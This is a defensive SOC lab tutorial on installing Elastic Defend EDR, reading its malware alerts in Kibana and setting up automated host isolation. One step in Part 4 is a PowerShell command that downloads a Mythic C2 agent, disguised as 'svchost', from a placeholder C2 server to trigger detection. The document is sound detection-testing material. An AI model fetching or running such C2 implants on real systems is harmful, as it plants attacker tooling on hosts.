## Day 29 — Setting Up Elastic Defend (EDR)

### 📋 Summary

Day 29 is the capstone of the challenge's defensive setup. Up until now, the ELK stack has been operating as a **detection and logging** platform — it watches and alerts, but does not actively stop threats. Today you add **Elastic Defend**, Elastic's native **Endpoint Detection and Response (EDR)** solution, which transforms your Windows server from a passive log source into an actively protected endpoint.

After installation, you'll test Elastic Defend by attempting to run your Mythic C2 agent — which the EDR will detect, quarantine, and block in real time. You'll then configure an **automated response action** that isolates the host whenever a malware alert fires, and verify that the isolation works end-to-end.

**What you'll learn:**
- What EDR is and how it differs from a SIEM
- How to install and configure Elastic Defend via Kibana Integrations
- The difference between EDR configuration types (Essential vs Complete)
- How to verify the EDR is active on your endpoint
- How Elastic Defend generates malware prevention telemetry
- How to read and interpret a Malware Prevention Alert in Kibana
- How to configure an **automated host isolation response action** on a detection rule
- How to verify automated isolation by re-attempting to download the C2 agent

---

### 🛠️ Prerequisites

| Component | Purpose |
|-----------|---------|
| Elastic Stack (ELK) on a cloud server | Running SIEM — must be operational |
| Kibana | Web UI for integration setup and alert review |
| Elastic Agent installed on Windows Server | Required — Elastic Defend deploys on top of it |
| Fleet Server | Manages agent policies centrally |
| Windows Server (agent enrolled in Fleet) | The endpoint Elastic Defend will protect |
| Mythic C2 agent binary | Used to trigger a real malware detection test |
| Mythic C2 server | Used to serve the agent binary for download |

> ⚠️ **Elastic Defend requires Elastic Agent.** It cannot be installed in standalone mode — your Windows Server must already be enrolled in Fleet. If your agent was unenrolled or is showing as inactive, re-enroll it before proceeding.

> 💡 **Free vs Trial/Paid tier:** With the free Elastic subscription, Elastic Defend installs and detects malware, but **remote host isolation is only available on the 30-day trial or paid tiers**. If you activated a trial in an earlier day of the challenge, you should have access to isolation. If you're on the free tier, you can still follow every step except the automated isolation test in Part 4.

---

### 🧠 Background: EDR vs SIEM — What's the Difference?

| | SIEM (Elastic Stack) | EDR (Elastic Defend) |
|---|---|---|
| **Primary function** | Collect, store, and correlate logs from many sources | Monitor, detect, and respond to threats on an endpoint |
| **Where it runs** | Centralized server | Directly on the endpoint (kernel-level) |
| **Response capability** | Alert and notify | Alert + actively block, quarantine, and isolate |
| **Data source** | Logs forwarded from agents | Deep endpoint telemetry (processes, memory, files, network) |
| **Detection method** | Rule-based queries on log data | Behavioral analysis, ML models, signature matching |

In this challenge, both work together: Elastic Defend **catches and stops** the threat at the endpoint, and the **SIEM surfaces the alert** in Kibana for analyst review.

**What EDR does for you:**
- Detects and blocks malware, ransomware, and fileless attacks in real time
- Provides a full process tree for every alert
- Enables one-click or automated host isolation to contain an incident
- Generates rich endpoint telemetry for threat hunting
- Adds file hash, quarantine path, and parent process context to every malware alert

---

### 🔧 Part 1 — Installing Elastic Defend

#### Step 1: Navigate to Integrations

1. Log in to **Kibana**.
2. Click the **hamburger menu (☰)** in the top-left corner.
3. Scroll down to the **Management** section.
4. Click **Integrations**.

---

#### Step 2: Find and Add Elastic Defend

1. In the Integrations search bar, type `Elastic Defend`.
2. Click on the **Elastic Defend** tile.
3. Click **Add Elastic Defend** in the top-right.

---

#### Step 3: Configure the Integration

You'll be presented with a configuration form. Fill it in as follows:

**Integration name:**
```
MyDFIR-EDR
```
> Name it something identifiable. If you have multiple endpoints, the name helps distinguish policies.

**Description (optional):**
```
Elastic Defend EDR for Windows Server endpoint protection
```

**Configuration type — Select environment:**
- Choose **Traditional Endpoints**
  > This covers standard desktops, laptops, and servers (VMs included). The alternative, "Cloud Workloads," is designed for Linux-based cloud infrastructure (containers, Kubernetes nodes).

**Protection preset — Select EDR level:**
- Choose **Complete EDR (Endpoint, Detection & Response)**
  > This unlocks the full telemetry suite and all protection features. "Essential EDR" provides a reduced feature set. Always select Complete EDR for a lab or production SOC environment.

> **Free tier note:** Complete EDR is available during the 30-day trial. On the free tier, you may only have access to Essential EDR features. The setup steps are identical — only the available capabilities differ.

---

#### Step 4: Attach to Your Windows Agent Policy

1. Under **"Where to add this integration"**, select **Existing hosts**.
2. From the policy dropdown, choose your **Windows Policy** (the one your Windows Server's Elastic Agent is enrolled in).
   > If you used Fleet Server during setup (recommended), all your agents are managed under named policies. Select the policy that includes your Windows Server.
3. Click **Save and continue**.
4. On the confirmation screen, click **Save and deploy changes**.

Elastic will push the Elastic Defend integration to your Windows Server automatically through Fleet. No manual installation on the Windows Server is required.

---

#### Step 5: Verify the Deployment

1. In Kibana, click the **hamburger menu (☰)**.
2. Under **Security**, click **Manage**.
3. Click **Endpoints**.

You should see your Windows Server listed as an active endpoint with:
- **Policy status:** Healthy
- **Agent status:** Online
- **Integration:** Elastic Defend

> If the endpoint does not appear within 2–3 minutes, check that the Elastic Agent service is running on the Windows Server (`services.msc` → look for `Elastic Agent`).

**Available Actions (Trial/Paid tier):**
Clicking the **Actions** dropdown next to your endpoint reveals:

| Action | What It Does |
|--------|-------------|
| Isolate host | Cuts the endpoint off from all network traffic except Elastic communication |
| Release host | Restores full network connectivity after isolation |
| Respond | Opens a live terminal-like console on the endpoint |
| Get processes | Returns the running process list |
| Suspend process | Pauses a specific running process |

---

### 🧪 Part 2 — Testing Elastic Defend: Malware Detection

Now that Elastic Defend is active, test it by attempting to run the Mythic C2 agent binary on the Windows Server. The EDR should detect and block it immediately.

#### Step 1: Attempt to Run the Mythic Agent

On your Windows Server:

1. Open **File Explorer** and navigate to the location of your Mythic agent binary (e.g., `C:\Users\Public\Downloads\svchost-[name].exe`).
2. Double-click the file to try to execute it.

**Expected result:** Windows will display a notification from Elastic Security stating the file was blocked, and the file will be quarantined automatically.

> If the original agent has already been quarantined from prior activity in Day 28, proceed to the download test in Part 4 instead, where you'll try downloading a fresh copy.

---

#### Step 2: Review the Malware Alert in Kibana — Discover

1. In Kibana, go to **Analytics → Discover**.
2. In the KQL search bar, type:
   ```kql
   malware
   ```
3. Press Enter. You should see **Malware Prevention Alert** entries at the top of the results.

4. Expand one of the malware log entries. Key fields to note:

| Field | What It Tells You |
|-------|------------------|
| `file.name` | Name of the quarantined file |
| `file.path` | Original location of the file on disk |
| `file.Ext.quarantine_path` | Where Elastic moved the file after quarantine |
| `file.hash.sha256` | Hash of the file — use with VirusTotal |
| `file.owner` | The user account that owned the file |
| `agent.type` | Should show `endpoint` (Elastic Defend) |
| `event.code` | Malware prevention event code |
| `event.action` | Action taken — e.g., `kill-process`, `quarantine` |
| `process.name` | The process that tried to execute the file |
| `process.parent.name` | What launched the malicious process |

---

#### Step 3: Review the Malware Alert in Kibana — Security Alerts

1. In Kibana, go to **Security → Alerts**.
2. Look for a **Malware Prevention Alert** — it will have a distinct orange or red severity badge.
3. Click to expand the alert.

What you'll see in the alert detail view:

- **Highlighted fields** — Elastic Defend automatically surfaces the most important context: username, process executable, file path, and file hash. Unlike custom SIEM rules where you had to configure Highlighted Fields manually (Day 28), Elastic Defend populates these automatically.
- **Process tree** — a visual representation of the parent → child process chain that led to the malicious execution. This is one of Elastic Defend's most valuable features for rapid triage.
- **Alert actions** — buttons to take immediate response actions directly from the alert detail view.

> **No investigation guide yet?** In a fresh lab environment, Elastic Defend's built-in investigation guides may not appear. In a production environment with Elastic's threat intelligence feeds active, investigation guides provide analyst runbooks directly inside the alert.

---

### ⚡ Part 3 — Configuring Automated Host Isolation

Rather than requiring an analyst to manually isolate a host after a malware alert, you can configure the detection rule to **automatically isolate the endpoint** the moment the alert fires. This is a core incident response automation capability.

> ⚠️ **Trial/Paid tier required.** Automated host isolation via Response Actions requires Elastic's trial or paid subscription. Free-tier users can configure the rule but the isolation action will not execute.

#### Step 1: Find the Malware Detection Rule

1. In Kibana, go to **Security → Rules → Detection Rules (SIEM)**.
2. Search for the Windows malware rule. It will be named something like:
   - `Malware Prevention Alert`
   - Or the specific rule that generated your alert (visible in the alert detail)
3. Click on the rule name to open it.
4. Click **Edit rule settings**.

---

#### Step 2: Add an Automated Response Action

1. In the rule settings, navigate to the **Response Actions** tab.
2. Click **Add response action**.
3. Select **Elastic Defend** from the list of available response action providers.
4. From the action dropdown, choose **Isolate host**.
5. Optionally add a comment:
   ```
   Automatically isolated due to malware detection by Elastic Defend.
   ```
6. Click **Save changes**.

The rule will now automatically trigger host isolation on any endpoint that generates a matching malware alert — no analyst intervention required.

---

### 🧪 Part 4 — Verifying Automated Isolation End-to-End

With the automated isolation response action configured, perform a live test to confirm the full detection → isolation chain works.

#### Step 1: Confirm Network Connectivity (Baseline)

On the Windows Server, open **Command Prompt** and run a continuous ping to confirm network is currently up:

```cmd
ping 8.8.8.8 -t
```

You should see replies coming in. **Leave this running** — it's your indicator of when isolation kicks in.

---

#### Step 2: Attempt to Download a Fresh C2 Agent

On the Windows Server, open **PowerShell** and use Invoke-WebRequest to download the Mythic agent from your C2 server's HTTP listener:

```powershell
Invoke-WebRequest -Uri "http://<Mythic-server-IP>:<port>/svchost-[name].exe" -OutFile "C:\Users\Public\Downloads\svchost-[name].exe"
```

**Expected sequence of events:**

1. The download begins (or may not even complete).
2. Elastic Defend detects the executable being written to disk.
3. Elastic Defend **quarantines the file** — it is deleted from the download location and moved to the quarantine store.
4. Elastic Defend **kills the associated process** if one was launched.
5. The malware alert fires in Kibana.
6. The automated response action triggers — the host is **isolated from the network**.
7. Your `ping 8.8.8.8 -t` in the Command Prompt window shows **Request timed out** — confirming isolation is active.

---

#### Step 3: Confirm Isolation in Kibana

1. Go to **Security → Manage → Endpoints**.
2. Your Windows Server should now show an **Isolated** status badge.
3. In the **Actions** menu, you'll see a **Release host** option — use this to restore connectivity after your test.

> 🔑 **Important:** Always release the host after testing. A permanently isolated endpoint cannot receive policy updates or forward logs to Elastic. In a real incident, you would release isolation only after confirming the threat has been fully remediated.

---

#### Step 4: Release the Host

1. On the Endpoints page, click **Actions** next to your Windows Server.
2. Click **Release host**.
3. Add a note:
   ```
   Testing complete. Host released after successful isolation validation.
   ```
4. Click **Confirm**.

Your `ping 8.8.8.8 -t` in Command Prompt should resume receiving replies within 30–60 seconds, confirming the host is back on the network.

---

### 📊 What Elastic Defend Telemetry Looks Like

After the test, you can query the raw Elastic Defend telemetry in Kibana Discover:

```kql
agent.type : "endpoint"
```

This returns all events generated by Elastic Defend. Useful sub-queries:

| Query | What It Returns |
|-------|----------------|
| `event.action : "quarantine"` | Files quarantined by EDR |
| `event.action : "kill-process"` | Processes terminated by EDR |
| `event.action : "isolated"` | Host isolation events |
| `event.action : "unisolated"` | Host release events |
| `event.category : "malware"` | All malware-category events |

---

### ✅ Summary of Key Takeaways

| Topic | Key Point |
|-------|-----------|
| What Elastic Defend is | An EDR — actively blocks threats at the endpoint, not just alerts |
| Installation method | Added via Kibana Integrations, deployed through Fleet (no manual install on endpoint) |
| Configuration type | Always choose **Complete EDR** for full telemetry and protection |
| Endpoint type | **Traditional Endpoints** for VMs, servers, desktops |
| Verification | Check **Security → Manage → Endpoints** for active status |
| Malware detection | Query `malware` in Discover, or check Security Alerts for Malware Prevention Alerts |
| Alert detail | Process tree + highlighted fields are auto-populated by Elastic Defend |
| Automated isolation | Configure via **Response Actions** tab in any detection rule → Elastic Defend → Isolate host |
| Isolation verification | Continuous ping drops to "Request timed out" when host is isolated |
| Release host | Always release after testing — isolated hosts stop forwarding logs |
| Free vs paid | Detection and quarantine work on free tier; remote isolation requires trial/paid |

---

### 🔄 How Elastic Defend Fits Into the Full SOC Architecture

```
Attacker attempts to run Mythic C2 agent on Windows Server
          │
          ▼
  Elastic Defend (EDR) detects malware on endpoint
          │
          ├─► Quarantines the file
          ├─► Kills the process
          └─► Generates telemetry → forwarded to Elastic via Agent
                    │
                    ▼
         Elastic SIEM receives the event
                    │
                    ├─► Malware Prevention Alert created in Kibana
                    ├─► Alert visible in Security → Alerts
                    └─► Response Action triggers → Host isolated
                                   │
                                   ▼
                    SOC Analyst reviews alert in Kibana
                    Investigates process tree + file hash
                    Releases host after remediation
```

---

### 🔗 Resources

- 📖 [Elastic Defend Official Documentation](https://www.elastic.co/docs/solutions/security/get-started/get-started-endpoint-security)
- 📖 [Elastic Defend — Automated Response Actions](https://www.elastic.co/guide/en/security/current/automated-response-actions.html)
- 📖 [Elastic Defend — Host Isolation](https://www.elastic.co/guide/en/security/current/host-isolation-ov.html)
- 📖 [Elastic Endpoint Response Actions Reference](https://www.elastic.co/guide/en/security/current/response-actions.html)
- 🔎 [VirusTotal — File Hash Lookup](https://www.virustotal.com)
---

> *Part of the MyDFIR 30-Day SOC Analyst Challenge. This tutorial is based on Day 29 content and is intended for educational purposes only. Elastic Defend and C2 tools should only be used in authorized lab environments.*
